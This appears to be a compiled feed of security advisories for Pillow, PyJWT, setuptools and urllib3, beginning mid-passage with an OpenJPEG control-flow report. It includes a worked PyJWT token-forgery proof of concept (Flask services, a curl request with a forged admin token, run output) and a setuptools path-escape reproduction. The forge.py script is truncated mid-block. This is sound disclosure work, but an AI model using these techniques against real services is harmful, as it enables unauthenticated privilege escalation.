**Ceiling, demonstrated as a primitive but not as a finished exploit.** With same-size-class objects alive on both sides — an ordinary busy heap — the walk crosses `opj_event_mgr_t`, which holds three `opj_msg_callback` function pointers, and `opj_event_msg` then calls one (event.c:136):

```
rip  0x4000    <- value chosen by the attacker's file layout
rsi  0x3ff2    <- m_error_data, written by the same walk
```

Shifting the codestream with a COM marker moves `rip` with it (`0x16ce` → `0x4000`), so the instruction pointer is attacker-**chosen** rather than incidentally invalid. A benign control image leaves the same groomed heap untouched.

To be explicit about what I did not do: I have **not** built a working exploit. That additionally needs remote heap grooming and an ASLR defeat, and I attempted neither. I am reporting a controlled control-flow primitive, not a finished chain. The CVSS AC:H reflects that.

Vulnerabilities.Title: pillow: Pillow: Denial of Service via unbounded recursion in PDF parser
Vulnerabilities.Description: Pillow is a Python imaging library. From 5.1.0 until 13.0.0, Pillow's PdfParser.get_value() can recurse without a limit while reading nested PDF objects. The parser follows attacker-controlled arrays and dictionaries when an existing PDF is opened for append. An attacker can provide a deeply nested PDF to an application that saves an image with PDF append enabled. This can raise an uncaught RecursionError or terminate the worker, causing denial of service. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Information disclosure via out-of-bounds read in raw decoders
Vulnerabilities.Description: Pillow is a Python imaging library. Prior to 13.0.0, Pillow's P;2L and P;4L raw decoders can read past the end of an input buffer. ImagingRawDecode calculates a packed-pixel row size, while the unpackers read separately padded bit planes. A caller can supply a buffer and image dimensions whose accepted size is smaller than the unpacker's actual footprint. This can disclose up to three adjacent heap bytes in output pixels or crash the process. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Information disclosure via crafted tiled TIFF image
Vulnerabilities.Description: Pillow is a Python imaging library. From 8.2.0 until 13.0.0, Pillow's tiled-TIFF decoder can read past the tile buffer while copying four-byte pixels. In _decodeTile, libtiff can return a tile allocation smaller than the required row stride multiplied by the tile length, and Pillow's stride-and-copy loop walks beyond that allocation. An attacker can supply a crafted tiled TIFF to an application that loads it. This can expose adjacent heap data in pixels or crash the process. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: arbitrary code execution via heap use-after-free during TIFF encoding
Vulnerabilities.Description: Pillow is a Python imaging library. From 11.3.0 until 13.0.0, Pillow has a heap use-after-free when libtiff rejects a tag while encoding TIFF data to an in-memory buffer. When an application saves attacker-influenced TIFF tags to BytesIO, libtiff can reject a tag during encoding in ImagingLibTiffEncode; the error path then frees the output buffer without closing or clearing the TIFF handle, and later cleanup flushes through the write callback into freed memory, which can crash the process and may enable code execution. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Denial of Service via crafted GIF comments
Vulnerabilities.Description: Pillow is a Python imaging library. From 5.4.0 until 13.0.0, Pillow performs quadratic copying while parsing GIF comments. GifImageFile._seek() repeatedly appends immutable bytes for comment sub-blocks and multiple comment extensions, and frame zero is parsed during Image.open(). An attacker can submit a small-dimension GIF containing many comment extensions to any application that opens the file. This can consume excessive CPU and deny service before the application can inspect the image. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Denial of Service via large GIF comments
Vulnerabilities.Description: Pillow is a Python imaging library. From 9.2.0 until 13.0.0, Pillow performs quadratic copying when saving a GIF with a long comment. _get_global_header() repeatedly copies portions of comment data while assembling the global header, including comments retained from an untrusted input image. An attacker can supply an image with a large GIF comment to an application that saves it as GIF. This can consume excessive CPU and delay or deny service. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: Pillow: Information disclosure via empty palette quantization
Vulnerabilities.Description: Pillow is a Python imaging library. From 9.1.0 until 13.0.0, Pillow can disclose uninitialized stack memory when Image.quantize() uses an empty palette. ImagingPaletteCacheUpdate() leaves a local cache array uninitialized when the palette has zero entries, and the conversion path emits those bytes as output pixel indices. An attacker who controls the palette image can obtain stack contents from a returned PNG or GIF. This can disclose addresses and stack-canary data without an out-of-bounds access, memory corruption, or process crash. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: Pillow is a Python imaging library. In versions 2.3.0 through 12.3.0,  ...
Vulnerabilities.Description: Pillow is a Python imaging library. In versions 2.3.0 through 12.3.0, EPS rendering does not validate the scaled image dimensions before invoking Ghostscript. Applications that process untrusted EPS or PostScript files using an application-selected scale greater than one can incur excessive Ghostscript CPU and temporary disk consumption. In versions with decompression-bomb protection, the scaled output is checked only after Ghostscript has completed rendering, allowing resource consumption beyond the configured pixel limit. The amplification depends on the scale selected by the application, not an attacker-controlled scale value. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: Pillow: Denial of Service via crafted XBM image header
Vulnerabilities.Description: Pillow is a Python imaging library. Prior to 13.0.0, Pillow's XBM header parser is vulnerable to regular-expression denial of service. In XbmImageFile._open, when an application calls Image.open() on a small crafted XBM file, XbmImagePlugin applies a backtracking expression to the attacker-controlled header before image dimensions are accepted, stalling a worker for minutes and denying service. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: Pillow: Information disclosure via improper memory alignment during Arrow export
Vulnerabilities.Description: Pillow is a Python imaging library. From 11.2.1 until 13.0.0, Arrow export assumes that an image's rows are tightly contiguous and exports from im->blocks[0].ptr even when PILLOW_ALIGNMENT makes aligned_linesize include row padding or an aligned offset before the first row. The resulting Arrow buffer can include uninitialized padding, bytes preceding the first row, or stale heap contents from previously freed images. Applications that configure alignment and export images to Arrow can therefore disclose one user's pixels or other process memory to another user. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Denial of Service via decompression bomb check bypass in multi-frame images
Vulnerabilities.Description: Pillow is a Python imaging library. Prior to 13.0.0, MpoImageFile.seek() and DcxImageFile.seek() reparse later MPO or DCX frames and replace self._size without rerunning Image._decompression_bomb_check(). A crafted multi-frame image can use a tiny first frame to pass Image.open() and then declare an over-limit later frame. Normal frame iteration through seek(), load(), or ImageSequence.Iterator can decode that frame and commit hundreds of megabytes or more, causing memory-exhaustion denial of service. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Denial of Service via crafted RLE BMP image
Vulnerabilities.Description: Pillow is a Python imaging library. From 9.1.0 until 13.0.0, BmpRleDecoder.decode() in src/PIL/BmpImagePlugin.py permits crafted RLE BMP delta escapes and absolute-mode runs to append beyond the remaining dest_length without a per-branch cap. A delta can add roughly 255 image rows in one iteration, so a kilobyte-sized file with a large but permitted width can expand the data bytearray to hundreds of megabytes or more, causing memory-exhaustion denial of service. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Denial of Service via integer overflow in text-width calculation
Vulnerabilities.Description: Pillow is a Python imaging library. Prior to 13.0.0, PILfont text-width accumulation in src/_imaging.c checks positive glyph advances against INT_MAX but does not check negative advances against INT_MIN. Repeating a signed 16-bit advance of -32768 can therefore execute a signed C integer overflow in xsize += dx, producing a large positive width from a negative mathematical result. Applications that use getlength(), getsize(), or derived layout, quota, serialization, or allocation calculations can experience logic-integrity errors or resource consumption, while the high-level mask path commonly retains a decompression-bomb check. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pyjwt: PyJWT: Authentication bypass via improper public key validation
Vulnerabilities.Description: PyJWT is a Python implementation of JSON Web Token standards. Prior to 2.14.0, is_pem_format in jwt/utils.py is affected because is_pem_format does not recognize every PEM representation accepted by the cryptography loader. This occurs when an application mixes HMAC and asymmetric algorithms and supplies a mutated public-key PEM as raw key bytes. As a result, HMACAlgorithm.prepare_key treats the unrecognized asymmetric public key as an HMAC secret. Consequently, an attacker who knows the public key can forge authenticated HMAC tokens. This issue is fixed in version 2.14.0.

Vulnerabilities.Title: pyjwt: pyjwt: Authentication bypass via empty HMAC key acceptance
Vulnerabilities.Description: PyJWT is a Python implementation of JSON Web Token standards. From 2.13.0 until 2.14.0, HMACAlgorithm.from_jwk is affected because PyJWK verification path used the decoded key without applying prepare_key validation. This occurs when a trusted JWK Set contains an oct entry with an empty k value. As a result, an attacker signs an HMAC token with the same zero-length key accepted by PyJWT. Consequently, forged token can carry arbitrary authenticated claims. This issue is fixed in version 2.14.0.

Vulnerabilities.Title: pyjwt: pyjwt: Verification key substitution via unvalidated JWKS redirects
Vulnerabilities.Description: PyJWT is a Python implementation of JSON Web Token standards. Prior to 2.14.0, PyJWT PyJWKClient is affected because redirect destinations are not revalidated against the JWKS trust boundary. This occurs when a configured trusted JWKS endpoint returns an attacker-influenced redirect. As a result, PyJWKClient follows the redirect and consumes the redirected response as key material. Consequently, forwarded credentials may be disclosed or verification keys may be substituted. This issue is fixed in version 2.14.0.

Vulnerabilities.Title: pyjwt: PyJWT: Authentication bypass via acceptance of DER public keys as HMAC secrets
Vulnerabilities.Description: PyJWT is a Python implementation of JSON Web Token standards. From 2.4.0 until 2.14.0, PyJWT HMACAlgorithm.prepare_key is affected because asymmetric-key guard relies on textual markers that are absent from DER encoding. This occurs when an application mixes HMAC and asymmetric algorithms and supplies a DER public key as the shared verification key. As a result, PyJWT uses public DER bytes as an HMAC secret. Consequently, an attacker who knows the public key can forge authenticated HMAC tokens. This issue is fixed in version 2.14.0.

Vulnerabilities.Title: pyjwt: pyjwt: Token forgery via improper Unicode byte-order mark handling
Vulnerabilities.Description: PyJWT is a Python implementation of JSON Web Token standards. From 2.13.0 until 2.14.0, HMACAlgorithm.prepare_key in jwt/algorithms.py is affected because raw-JWK detector does not normalize accepted Unicode byte-order marks before checking for JSON. This occurs when a public JWK is prefixed with a UTF-8 BOM and used in a mixed-algorithm verification path. As a result, public JWK bypasses asymmetric-key detection and becomes the HMAC secret. Consequently, an attacker who knows the public key can forge authenticated tokens. This issue is fixed in version 2.14.0.

Vulnerabilities.Title: pyjwt: pyjwt: Token forgery via acceptance of public JWK containers as HMAC secrets
Vulnerabilities.Description: PyJWT is a Python implementation of JSON Web Token standards. From 2.13.0 until 2.14.0, PyJWT HMACAlgorithm.prepare_key is affected because HMAC key guard only recognizes top-level public JWK forms and misses container representations. This occurs when an application allows HMAC and asymmetric algorithms and passes a public JWK container as the raw key. As a result, public asymmetric key material is accepted as the HMAC secret. Consequently, an attacker who knows the public key can forge a token with arbitrary authenticated claims. This issue is fixed in version 2.14.0.

Vulnerabilities.Title: PyJWT: HS256/384/512 verify accepts empty HMAC key via oct JWK (PyJWK/PyJWKClient) enabling token forgery
Vulnerabilities.Description:
### Summary

`HMACAlgorithm.from_jwk` accepts a symmetric (`kty=oct`) JWK whose `k` value is
the empty string and returns a zero-length key without raising. When a token is
then verified with that key object (a `PyJWK`, or a `PyJWK` resolved by
`PyJWKSet` / `PyJWKClient`), the HMAC verifier computes
`HMAC(key=b"", signing_input)` and accepts any token an attacker forged with the
same empty key. The attacker needs no secret knowledge: they reproduce the digest
locally with an empty key and set the token's `kid` to the empty-`k` JWK.

The empty-key rejection that `HMACAlgorithm.prepare_key` performs for
string/bytes secrets (added in 2.13.0) was never propagated to the sibling
`from_jwk` code path, so the JWK/JWKS verification route stays exploitable. Under
default decode options this path only emits an `InsecureKeyLengthWarning`, not an
error, so verification still succeeds. This is the same "empty/nil HMAC key is
accepted by verify" defect the JWT ecosystem is currently closing library-side:
fast-jwt CVE-2026-44351 (CVSS 9.1) and ruby-jwt CVE-2026-45363 both added a
library-side reject-empty-HMAC-key precondition.

### Affected versions

`PyJWT` (PyPI package `pyjwt`) `<= 2.13.0`, current `master` at commit
`7144e4534c34810f4525dc4578a32addd8212cff`. The string/bytes secret path is
already guarded in 2.13.0; the JWK/JWKS path is not.

### Privilege required

Unauthenticated. Any party who can reach a JWT-verifying endpoint of an
application that verifies via a `PyJWK` / `PyJWKSet` / `PyJWKClient` whose oct
key has an empty `k` can forge tokens with arbitrary claims.

Preconditions: the verifier resolves the HMAC key from a JWK/JWKS whose oct
entry carries an empty `k`. This occurs when the signing secret is sourced from
an unset environment variable / unset config row / key-finder fallback that
base64url-encodes `b""` into the published JWKS, or when the application trusts a
JWKS containing such an entry. The equivalent unset-secret case for the
string-secret API (`jwt.decode(token, key="")`) is already rejected in 2.13.0;
the JWK route is the remaining reachable surface for the same misconfiguration.

### Vulnerable code

`jwt/algorithms.py`, `HMACAlgorithm.from_jwk` (line 380):

```python
@staticmethod
def from_jwk(jwk: str | JWKDict) -> bytes:
    try:
        if isinstance(jwk, str):
            obj: JWKDict = json.loads(jwk)
        elif isinstance(jwk, dict):
            obj = jwk
        else:
            raise ValueError
    except ValueError:
        raise InvalidKeyError("Key is not valid JSON") from None

    if obj.get("kty") != "oct":
        raise InvalidKeyError("Not an HMAC key")

    return base64url_decode(obj["k"])   # <-- empty k -> b"", no rejection
```

Contrast the sibling `prepare_key`, which DID get the guard (lines 325-329):

```python
def prepare_key(self, key: str | bytes) -> bytes:
    key_bytes = force_bytes(key)

    if len(key_bytes) == 0:
        raise InvalidKeyError("HMAC key must not be empty.")
```

In `jwt/api_jws.py`, `_verify_signature` (lines 389-416) uses the `PyJWK` key
material directly, bypassing `prepare_key`, and the length warning is non-fatal
by default:

```python
        if isinstance(key, PyJWK):
            if alg != key.algorithm_name:
                raise InvalidAlgorithmError(
                    f"Token algorithm {alg!r} does not match the key's "
                    f"algorithm {key.algorithm_name!r}"
                )
            alg_obj = key.Algorithm
            prepared_key = key.key            # from_jwk output (b""), prepare_key not run
        else:
            try:
                alg_obj = self.get_algorithm_by_name(alg)
            except NotImplementedError as e:
                raise InvalidAlgorithmError("Algorithm not supported") from e
            prepared_key = alg_obj.prepare_key(key)

        key_length_msg = alg_obj.check_key_length(prepared_key)
        if key_length_msg:
            if effective_options.get("enforce_minimum_key_length", False):
                raise InvalidKeyError(key_length_msg)
            else:
                warnings.warn(key_length_msg, InsecureKeyLengthWarning, stacklevel=4)  # default: warn only

        if not alg_obj.verify(signing_input, prepared_key, signature):  # verify with b"" succeeds
            raise InvalidSignatureError("Signature verification failed")
```

`PyJWK.__init__` sets `self.key = self.Algorithm.from_jwk(self._jwk_data)`, so a
`{"kty":"oct","k":""}` JWK yields `PyJWK.key == b""`. `PyJWKSet` and
`PyJWKClient.get_signing_key_from_jwt` build `PyJWK` objects the same way, so the
JWKS-over-HTTP resolution route is affected identically.

The 2.13.0 release note (`CHANGELOG.rst`) documents the `prepare_key` JWK/PEM
hardening (GHSA-xgmm-8j9v-c9wx) and the `PyJWK` alg-binding fix
(GHSA-jq35-7prp-9v3f), and the test suite has
`test_hmac_prepare_key_rejects_empty_key` plus
`test_hmac_from_jwk_should_raise_exception_if_empty_json` (which tests an empty
JSON object `{}`, not an oct key with empty `k`). The empty-`k` oct case is the
untested sibling path this report closes.

### How the attacker input reaches the sink

An unauthenticated HTTP client controls the bearer token entirely: its `kid`
selects the empty-`k` oct JWK, and its signature is computed locally with the
empty key. The token flows request header -> `PyJWKClient.get_signing_key_from_jwt`
(kid resolution against the trusted JWKS) -> `jwt.decode` with the resolved
`PyJWK` -> `_verify_signature` -> `HMACAlgorithm.verify(signing_input, b"", sig)`.
No secret,
credential, or prior session is required; the only server-side precondition is a
JWKS oct entry with an empty `k`, which the "unset signing secret" configuration
produces. This is the identical trust boundary the string-secret path already
guards.

### Proof of concept

### End-to-end reproduction against pinned PyPI `pyjwt` 2.13.0 (two deployed Flask services)

Two services model a standard OIDC-style deployment: an auth service publishing a
JWKS, and a protected resource server validating bearer tokens against that JWKS
with PyJWT's documented `PyJWKClient` pattern. The auth service's signing secret
is sourced from an unset env var (`SIGNING_SECRET` unset -> `""`), so the
published oct JWK carries `k == ""`.

`idp.py` (auth service):

```python
import os, base64
from flask import Flask, jsonify
app = Flask(__name__)
SIGNING_SECRET = os.environ.get("SIGNING_SECRET", "")   # UNSET at runtime -> ""
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

@app.route("/.well-known/jwks.json")
def jwks():
    return jsonify({"keys": [{
        "kty": "oct", "use": "sig", "alg": "HS256",
        "kid": "auth-signing-2026",
        "k": b64u(SIGNING_SECRET.encode()),   # empty secret -> k == ""
    }]})

if __name__ == "__main__":
    app.run(port=9101)
```

`api.py` (protected resource server):

```python
from flask import Flask, request, jsonify
import jwt
from jwt import PyJWKClient
app = Flask(__name__)
jwks_client = PyJWKClient("http://127.0.0.1:9101/.well-known/jwks.json")

def authenticate():
    auth = request.headers.get("Authorization", "")
    if not auth.startswith("Bearer "):
        return None, "missing bearer token"
    token = auth.split(" ", 1)[1]
    try:
        signing_key = jwks_client.get_signing_key_from_jwt(token)  # resolves by kid
        claims = jwt.decode(token, signing_key, algorithms=["HS256", "RS256"])
    except Exception as e:
        return None, "invalid token: %s" % type(e).__name__
    return claims, None

@app.route("/api/admin/users")
def admin_users():
    claims, err = authenticate()
    if err:
        return jsonify({"error": err}), 401
    if claims.get("role") != "admin":
        return jsonify({"error": "forbidden"}), 403
    return jsonify({"ok": True, "action": "list_all_users",
                    "as_user": claims.get("sub"), "role": claims.get("role")})

if __name__ == "__main__":
    app.run(port=9102)
```

`forge.py` (attacker; no secret knowledge):

```python
import hmac, hashlib, base64, json, sys

Run:

```bash
python -m venv v && ./v/bin/pip install "PyJWT==2.13.0" flask
( SIGNING_SECRET= ./v/bin/python idp.py & ) ; ./v/bin/python api.py &
FORGED=$(./v/bin/python forge.py "")
curl -s -H "Authorization: Bearer $FORGED" http://127.0.0.1:9102/api/admin/users
```

Verbatim run (attack, both negative controls, sanity, and patched-build re-run):

```
### PyJWT version
2.13.0

### JWKS published by the auth service (note the empty "k"):
{"keys":[{"alg":"HS256","k":"","kid":"auth-signing-2026","kty":"oct","use":"sig"}]}

### Baseline: unauthenticated request to admin endpoint
HTTP 401

### ATTACK: attacker forges HS256 admin token signed with the EMPTY key
forged token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImF1dGgtc2lnbmluZy0yMDI2In0.eyJzdWIiOiJhdHRhY2tlckBldmlsLmV4YW1wbGUiLCJyb2xlIjoiYWRtaW4ifQ.iwgDP9D-oD0zXWMEUhx710f_NjHWKkrLVgjPAOtEUSQ
response:
{"action":"list_all_users","as_user":"attacker@evil.example","ok":true,"role":"admin"}
  <-- HTTP 200

### NEGATIVE CONTROL 1: forge with a WRONG non-empty key (IdP still empty) -> reject
{"error":"invalid token: InvalidSignatureError"}
  <-- HTTP 401

### NEGATIVE CONTROL 2: IdP restarted with a REAL non-empty secret; empty-key forgery must now fail
JWKS now has non-empty k:
{"keys":[{"alg":"HS256","k":"YS1yZWFsLTMyLWJ5dGUtc3Ryb25nLXNlY3JldC12YWx1ZS0xMjM0","kid":"auth-signing-2026","kty":"oct","use":"sig"}]}
{"error":"invalid token: InvalidSignatureError"}
  <-- HTTP 401

### Sanity: a legitimately-signed token with the real secret is accepted
{"action":"list_all_users","as_user":"attacker@evil.example","ok":true,"role":"admin"}
  <-- HTTP 200

### PATCHED BUILD (from_jwk rejects empty k): re-run the empty-key forgery -> now rejected
JWKS (empty k, vulnerable config):
{"keys":[{"alg":"HS256","k":"","kid":"auth-signing-2026","kty":"oct","use":"sig"}]}
{"error":"invalid token: PyJWKSetError"}
  <-- HTTP 401
```

The attack returns HTTP 200 with `role:admin` from an unauthenticated forged
token. Both negative controls (wrong non-empty key; real non-empty secret at the
auth service) return 401, isolating the defect to empty-key acceptance. The
patched build (the `from_jwk` fix below) rejects the forgery.

### Impact

- Unauthenticated authentication bypass / token forgery: an attacker mints tokens
  with arbitrary claims (`role:admin`, arbitrary `sub`) that verify successfully,
  yielding full impersonation and privilege escalation on any endpoint gated by
  such tokens.
- Reachable through the documented JWKS verification API
  (`PyJWKClient` / `PyJWKSet` / `PyJWK`), not just direct `HMACAlgorithm` use.
- Triggered by the common "unset signing secret" misconfiguration that the
  string-secret path already rejects in 2.13.0, leaving the JWK path as an
  asymmetric gap.

### Suggested fix

Reject a zero-length key in `HMACAlgorithm.from_jwk`, mirroring the guard that
`prepare_key` already applies:

```python
if obj.get("kty") != "oct":
    raise InvalidKeyError("Not an HMAC key")

key_bytes = base64url_decode(obj["k"])
if len(key_bytes) == 0:
    raise InvalidKeyError("HMAC key must not be empty.")
return key_bytes
```

This reuses the exact error message and length check the string/bytes path uses,
so both HMAC key-loading routes enforce the same invariant. A regression test for
the empty-`k` oct JWK belongs next to `test_hmac_from_jwk_should_raise_exception_if_empty_json`.

### Fix PR

https://github.com/jpadilla/pyjwt-ghsa-pxh4-856f-4h89/pull/1 (private advisory
temp fork, base `master`, branch `fix/hmac-from-jwk-reject-empty-key`,
DCO-signed; adds `test_hmac_from_jwk_rejects_empty_k`; `test_algorithms.py`,
`test_api_jwk.py`, `test_api_jws.py` pass).

### Credit

Reported by tonghuaroot.

> Maintainer update (2026-09-10): We reproduced the reported behavior: an `oct` JWK with an empty `k` value was decoded to an empty HMAC key and accepted through the JWK/PyJWK verification path, while the raw string/bytes path correctly rejected an empty key. The fix adds the same empty-key validation at the JWK boundary and includes a regression test. It is committed as `af8181ca0bec5e6b372fbba9afbe23702b787ceb` and has passed the available project tox environments, including crypto and non-crypto tests on Python 3.9, 3.12, and 3.13, plus mypy, package metadata, and coverage checks. Fresh Astra/max review accepted the fix and confirmed that nonempty, binary, and asymmetric-key behavior remains unchanged. The fix has not yet shipped in a released PyJWT version, so this advisory is being moved to draft and remains unpublished pending release.

## Maintainer update — 2026-09-11

The verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version.

Vulnerabilities.Title: pyjwt: PyJWT: Denial of Service via outbound request amplification on unknown key identifiers
Vulnerabilities.Description: PyJWT is a Python implementation of JSON Web Token standards. Prior to 2.14.0, PyJWT get_signing_key_from_jwt is affected because unknown kid misses force refreshes without a negative cache or minimum refresh interval. This occurs when unauthenticated tokens repeatedly use the same unknown kid or varying kid values absent from the cached JWKS. As a result, each cache miss causes PyJWKClient to refresh the JWKS. Consequently, attacker traffic can amplify outbound requests to the configured JWKS endpoint. This issue is fixed in version 2.14.0.

Vulnerabilities.Title: pyjwt: PyJWT: Denial of Service via deeply nested JSON token payload
Vulnerabilities.Description: PyJWT is a Python implementation of JSON Web Token standards. From 2.0.0a1 until 2.15.0, PyJWT PyJWKClient.get_signing_key_from_jwt is affected because payload parser catches ValueError but not RecursionError. This occurs when an attacker-controlled recursively nested payload reaches json.loads. As a result, documented PyJWT exception handling does not contain the failure. Consequently, an unauthenticated request can raise an exception that may produce an HTTP 500 response. The advisory-defined affected implementation also includes jwt/api_jwt.py, verify_signature=False. This issue is fixed in version 2.15.0.

Vulnerabilities.Title: pyjwt: pyjwt: Denial of Service via deeply nested token headers
Vulnerabilities.Description: PyJWT is a Python implementation of JSON Web Token standards. From 2.13.0 until 2.14.0, PyJWS._load in jwt/api_jws.py is affected because parser catches ValueError but not RecursionError. This occurs when a deeply nested token header reaches json.loads. As a result, RecursionError escapes the documented PyJWT error hierarchy. Consequently, an unauthenticated malformed token can cause a request-level failure and HTTP 500. This issue is fixed in version 2.14.0.

Vulnerabilities.Title: pyjwt: PyJWT: Token revocation bypass via non-canonical signature decoding
Vulnerabilities.Description: PyJWT is a Python implementation of JSON Web Token standards. Prior to 2.14.0, PyJWT signature segment is affected because signature segment decoding accepts characters outside the canonical Base64URL representation. This occurs when non-Base64URL characters are appended to a valid compact JWS signature segment. As a result, base64url_decode produces the same signature bytes for different serialized segments. Consequently, raw-token revocation checks can fail to recognize an equivalent modified token. This issue is fixed in version 2.14.0.

Vulnerabilities.Title: pyjwt: pyjwt: Denial of Service via regular expression backtracking in is_pem_format
Vulnerabilities.Description: PyJWT is a Python implementation of JSON Web Token standards. Prior to 2.14.0, PyJWT is_pem_format is affected because lazy PEM regular expression backtracks extensively. This occurs when a certificate-like input contains repeated BEGIN markers without a matching END marker. As a result, is_pem_format performs unbounded backtracking while searching for a PEM end marker. Consequently, an attacker can cause intensive CPU consumption. This issue is fixed in version 2.14.0.

Vulnerabilities.Title: pyjwt: pyjwt: Denial of Service via malformed RSA key in JWK set
Vulnerabilities.Description: PyJWT is a Python implementation of JSON Web Token standards. From 2.9.0 until 2.14.0, PyJWKSet does not catch the plain ValueError raised for malformed RSA JWK components by RSAAlgorithm.from_jwk in  jwt/api_jwk.py. This occurs when a JWK Set contains a malformed RSA key alongside otherwise usable keys. As a result, one malformed member aborts construction of the entire PyJWKSet. Consequently, applications can experience authentication failures or request-level denial of service. This issue is fixed in version 2.14.0.

Vulnerabilities.Title: pyjwt: PyJWT: Token verification bypass via mismatched OKP key components
Vulnerabilities.Description: PyJWT is a Python implementation of JSON Web Token standards. From 2.1.0 until 2.15.0, PyJWT OKPAlgorithm.from_jwk in  jwt/algorithms.py is affected because private-JWK import path does not compare the public key derived from d with x. This occurs when an OKP private JWK supplies non-corresponding x and d components. As a result, identity derived from x can differ from operations performed with d. Consequently, if an integration also accepts private key parameters from a proof header without rejecting them, an attacker may use a stolen sender-constrained token without the legitimate private key. This issue is fixed in version 2.15.0.

Vulnerabilities.Title: pyjwt: pyjwt: Token validation bypass via options dictionary mutation
Vulnerabilities.Description: PyJWT is a Python implementation of JSON Web Token standards. From 2.11.0 through 2.13.0, PyJWT's PyJWT._merge_options() method can modify a caller-supplied mutable options mapping when verify_signature is false. If an application reuses that same mapping for a later decode() or decode_complete() call and changes verify_signature to true, the mapping can retain false values for expiration, not-before, issued-at, audience, issuer, subject, and JWT ID checks. A signed token with invalid registered claims can then be accepted without disabling signature verification, but applications that create a fresh options mapping for each call are not affected.

Vulnerabilities.Title: setuptools: Windows path escape via namespace_packages.txt during legacy wheel installation  Description
Vulnerabilities.Description:
### Summary

On Windows, attacker-controlled content in a wheel's
`.dist-info/namespace_packages.txt` can cause setuptools' legacy wheel
installation path to create an `__init__.py` outside the requested
`destination_eggdir`.

The attacker can influence the destination path, but not the contents of
the created file.

### Details

Tested setuptools commit:

`6ead555c5fb29bc57fe6105b1bffc163f56fd558`

Relevant source:

`setuptools/wheel.py`

SHA-256:

`359b7e0d5dd8c3135653abe08a8ed5dc0352eadfd7df22cb5e2b5303b7c3cafd`

The relevant call path is:

`Wheel(wheel_path).install_as_egg(destination)`
→ `_install_as_egg`
→ `_convert_metadata`
→ `_fix_namespace_packages`

A wheel can provide attacker-controlled content in:

`<distribution>.dist-info/namespace_packages.txt`

The namespace value is eventually used approximately as:

```python
mod_dir = os.path.join(destination_eggdir, *mod.split('.'))
mod_init = os.path.join(mod_dir, '__init__.py')

If mod is a Windows drive-qualified absolute path containing no dots,
mod.split('.') preserves it as a single component.
On Windows, os.path.join(destination_eggdir, absolute_component) discards
the original base directory and resolves to the attacker-supplied absolute
path.
The existing wheel filename and ZIP traversal checks do not validate this
metadata value before it is subsequently interpreted as a filesystem path.

```markdown
### PoC

The reproduction was performed entirely inside a disposable temporary
directory.

Layout:

```text
sandbox/
    destination/
    outside/
    input/
    canary.txt
```

A synthetic wheel was created containing:

`demo_pkg-1.0.dist-info/namespace_packages.txt`

whose content was the absolute path of:

`sandbox\outside`

The real acquired setuptools implementation was then invoked:

```python
setuptools.wheel.Wheel(synthetic_wheel).install_as_egg(
    sandbox_destination
)
```

The operation completed without exception.

Expected metadata was created under:

`sandbox\destination\EGG-INFO`

but setuptools also created:

`sandbox\outside\__init__.py`

The file did not exist before execution.

Its contents were:

```python
__import__('pkg_resources').declare_namespace(__name__)
```

The unrelated canary remained byte-identical.

The sandbox was deleted after recording the evidence.
```


### Impact

A crafted wheel can cause setuptools to create a fixed-content
`__init__.py` outside the intended installation directory at a
filesystem path influenced by the wheel, with the permissions of the
process performing the installation.

The demonstrated reproduction required the target parent directory to
already exist.

Vulnerabilities.Title: urllib3: urllib3: Traffic interception via HTTPS proxy TLS configuration override
Vulnerabilities.Description: urllib3 is an HTTP client library for Python. From 1.26.0 until 2.8.0, the proxy_ssl_context, proxy_assert_hostname, proxy_assert_fingerprint, ssl_context, cert_reqs, verify_mode, use_forwarding_for_https=True, and CERT_NONE configuration paths fail to remain separated because target-server TLS settings are incorrectly applied to the HTTPS proxy connection. The trigger is that an application uses an HTTPS proxy and configures target-server TLS settings that must remain separate from the proxy TLS handshake, including HTTPS forwarding with target-specific identity or credentials. Applying cert_reqs=CERT_NONE can overwrite proxy_ssl_context.verify_mode in place, and the mutation persists so later connections reusing the same context may connect to the HTTPS proxy without certificate verification. The attack mechanism is that an attacker intercepts and impersonates the HTTPS proxy after the effective proxy policy accepts the attacker's certificate. The impact is that the attacker can observe or modify forwarded traffic or receive a target TLS client certificate, while CONNECT tunneling still preserves the separate end-to-end target TLS connection. This issue is fixed in version 2.8.0.

Vulnerabilities.Title: urllib3: urllib3: Denial of Service via unbounded memory allocation in chunk parser
Vulnerabilities.Description: urllib3 is an HTTP client library for Python. From 1.10.3 until 2.8.0, the HTTPResponse.read_chunked and HTTPResponse.stream methods can allocate unbounded memory because the streaming chunk parser buffers the chunk-size field until newline or EOF without a length bound. The trigger is that a malicious server returns Transfer-Encoding: chunked followed by a very long run of bytes without a newline. The attack mechanism is that a malicious HTTP server sends a very long unterminated chunk-size line. The impact is that unbounded memory allocation can exhaust the client process. This issue is fixed in version 2.8.0.

Vulnerabilities.Title: urllib3: urllib3: Denial of Service via infinite loop during chunked Deflate decoding
